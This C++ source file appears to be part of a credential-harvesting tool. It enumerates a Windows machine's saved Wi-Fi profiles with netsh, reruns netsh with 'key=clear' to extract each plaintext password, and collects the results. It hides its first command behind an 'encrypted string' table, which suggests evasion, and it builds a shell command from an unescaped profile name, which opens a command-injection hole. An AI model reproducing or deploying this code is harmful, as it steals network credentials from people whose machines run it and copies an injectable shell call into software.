#include "infrastructure/system/WindowsWifiService.hpp"

#include <array>
#include <cstdio>
#include <memory>
#include <sstream>
#include <string>

#include "domain/common/StringTable.hpp"

namespace nuub::infrastructure::system {

std::string WindowsWifiService::get_saved_networks() {
    std::string result;

    // Use encrypted string for netsh command
    std::string netsh_profiles = domain::StringTable::get("netsh_profiles");
    FILE* pipe = _popen(netsh_profiles.c_str(), "r");
    if (!pipe) return "Error: could not execute netsh";

    std::array<char, 4096> buffer{};
    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
        result += buffer.data();
    }
    _pclose(pipe);

    // Extract profile names and get their keys
    std::istringstream iss(result);
    std::string line;
    std::string output = "Saved WiFi Networks:\n\n";

    while (std::getline(iss, line)) {
        // Find lines with "All User Profile" or "Perfil de todos los usuarios"
        if (line.find("All User Profile") != std::string::npos ||
            line.find("Perfil de todos los usuarios") != std::string::npos) {
            // Extract profile name (after the colon)
            auto pos = line.find(':');
            if (pos != std::string::npos) {
                std::string profile = line.substr(pos + 1);
                // Trim whitespace
                while (!profile.empty() && profile[0] == ' ') profile.erase(0, 1);
                while (!profile.empty() && profile.back() == ' ') profile.pop_back();

                if (!profile.empty()) {
                    output += "Network: " + profile + "\n";

                    // Get the password for this profile
                    std::string cmd = "netsh wlan show profile name=\"" + profile + "\" key=clear 2>&1";
                    FILE* key_pipe = _popen(cmd.c_str(), "r");
                    if (key_pipe) {
                        std::array<char, 4096> key_buf{};
                        while (fgets(key_buf.data(), static_cast<int>(key_buf.size()), key_pipe) != nullptr) {
                            std::string key_line(key_buf.data());
                            if (key_line.find("Key Content") != std::string::npos ||
                                key_line.find("Contenido de la clave") != std::string::npos) {
                                auto kpos = key_line.find(':');
                                if (kpos != std::string::npos) {
                                    std::string key = key_line.substr(kpos + 1);
                                    while (!key.empty() && key[0] == ' ') key.erase(0, 1);
                                    while (!key.empty() && key.back() == ' ') key.pop_back();
                                    // Remove trailing newline
                                    while (!key.empty() && (key.back() == '\n' || key.back() == '\r')) key.pop_back();
                                    output += "Password: " + key + "\n";
                                }
                            }
                        }
                        _pclose(key_pipe);
                    }
                    output += "\n";
                }
            }
        }
    }

    return output;
}

} // namespace nuub::infrastructure::system
